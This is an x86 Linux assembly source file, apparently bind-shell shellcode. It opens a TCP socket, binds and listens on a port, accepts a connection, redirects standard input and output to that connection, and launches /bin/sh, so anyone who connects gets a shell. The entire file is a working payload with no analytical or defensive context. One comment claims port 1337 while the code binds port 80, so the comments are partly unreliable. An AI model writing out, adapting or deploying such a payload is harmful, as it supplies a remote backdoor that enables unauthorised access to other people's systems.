global _start  
section .text  
  
_start:  

;    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  

	mov    eax,0x66	;socket sys
	xor    edx,edx	
	push   edx	;->
 	inc    edx	;edx=1
 	push   edx	;->
 	xor    ebx,ebx	;ebx=0
 	inc    ebx	;ebx=1
 	inc    edx	;edx=2
 	push   edx	;->
 	mov    ecx,esp	
 	int    0x80	;systemcall

 	xchg   esi,eax	; ESI=value of socketfd   , EAX=0x2

;    hostaddr.sin_family = AF_INET;  
;    hostaddr.sin_port = htons(1337);  
;    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

	inc    ebx	;ebx=2
	xor    edx,edx	;edx=0
	push   edx	;-> INADDR_ANY
	push   word  0x5000;-> port 80 
	push   bx	;->Value of 2
	mov    ecx,esp	
;-----------------------------------

;    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  

	push   0x10	;address of 16 ->
	push   ecx	;-> [parameter of structure's &hostaddr]
	push   esi	;-> 
	mov    ecx,esp	;move parameter into ecx register
	mov    eax,0x66	; socket syscall
	int    0x80	; syscall

;    listen(host_sockid, 2);  

	mov    eax,0x66 ; socket syscall
	push   ebx	;->
	inc    ebx	;ebx=3
	inc    ebx	;ebx=4
	push   esi	;->
	mov    ecx,esp
	int    0x80	; syscall


;    client_sockid = accept(host_sockid, NULL, NULL);  

	xor    edx,edx	;edx=0
	push   edx	;->
	push   edx	;->
	push   esi	;->
	mov    ecx,esp	
	inc    ebx	;ebx=5 || accept
	mov    eax,0x66	;socket syscall
	int    0x80	;syscall

;    dup2(client_sockid, 0);  
;    dup2(client_sockid, 1);  
;    dup2(client_sockid, 2);  

	xor    ecx,ecx	;ecx=0
	mov    ebx,eax	;ebx= newsocket_value
loop:
	mov al, 0x3f	;dup2
	int 0x80	;syscall
	inc ecx		;1,2,....
	cmp ecx,0x4	; compare 
	jne loop	; loop back

;execve("/bin/sh", NULL, NULL);  
	
	mov eax,0xb	;execve syscall
	xor edx,edx	;edx =0
	push edx	;->
	push 0x68732f2f	;hs//		->
	push 0x6e69622f	;nib/		->
	
	mov ebx, esp
	mov ecx, edx
	
	int 0x80
